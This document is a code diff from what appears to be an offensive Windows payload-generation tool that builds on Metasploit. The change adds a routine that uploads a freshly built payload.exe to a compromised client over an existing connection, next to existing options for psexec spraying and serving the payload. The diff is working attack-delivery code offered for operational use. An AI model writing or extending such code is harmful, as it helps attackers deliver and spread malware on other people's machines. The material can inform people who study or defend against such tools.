@@ -5,6 +5,7 @@ from startmetasploit import *
 from generatepayload import *
 from menu import *
 from encrypt import *
+from sockets import *
 
 payloaddir = '/etc/winpayloads'
 
@@ -80,7 +81,11 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     os.system('mv dist/payload.exe %s/%s.exe'% (payloaddir,payloadname))
     print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir, payloadname) + t.normal
     CleanUpPayloadMess(payloadname)
-    DoPayloadUpload(payloadname)
+    from menu import clientMenuOptions
+    if len(clientMenuOptions.keys()) > 2:
+        DoClientUpload(payloaddir,payloadname)
+    else:
+        DoPayloadUpload(payloadname)
 
 
 def CleanUpPayloadMess(payloadname):
@@ -96,3 +101,23 @@ def DoPayloadUpload(payloadname):
         DoPsexecSpray(payloaddir + '/' + payloadname)
     elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
         FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), payloadname, payloaddir)
+
+def DoClientUpload(payloaddir,payloadname):
+    use_client_upload = raw_input(
+        '\n[*] Upload Using Client Connection? [y]/n: ')
+    if use_client_upload.lower() == 'y' or use_client_upload == '':
+        from menu import clientMenuOptions
+        for i in clientMenuOptions.keys():
+            if i == 'back' or i == 'r':
+                pass
+            else:
+                print t.bold_yellow + i +t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.normal + '\n'
+        while True:
+            clientchoice = raw_input('>>')
+            try:
+                clientconn, clientnumber = clientMenuOptions[clientchoice]['params']
+                break
+            except:
+                continue
+
+        clientUpload((payloaddir + '/' + payloadname + '.exe'),clientconn)
